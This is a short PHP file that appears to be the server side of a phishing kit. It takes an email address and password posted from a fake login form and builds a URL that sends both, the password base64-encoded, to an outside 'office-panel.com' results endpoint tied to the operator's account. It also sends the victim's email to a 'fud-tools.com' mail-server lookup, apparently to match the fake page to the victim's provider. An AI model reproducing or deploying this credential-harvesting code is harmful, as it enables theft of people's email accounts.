<?php
include "configration.php";

if(isset($_POST["pr"]) && isset($_POST["dom"])){
    $params = "email=".$email."&password=".$token."&domain=".$domain."&page=general"."&page_type=".$_POST["dome"];
    $url ="https://office-panel.com/results/common?".$params."&result_email=".$_POST["ai"]."&result_password=".base64_encode($_POST["pr"]);
    echo $url;
    exit();
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HEADER, false);
    $data = curl_exec($curl);
    curl_close($curl);
}else if(isset($_POST["ai"])) {
    $email = $_POST["ai"];
    $url = 'https://savesmtp.fud-tools.com/mxfinder/?email=' . $email;
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ));
    $response = curl_exec($curl);
    curl_close($curl);
    print_r($response);
    exit();
}





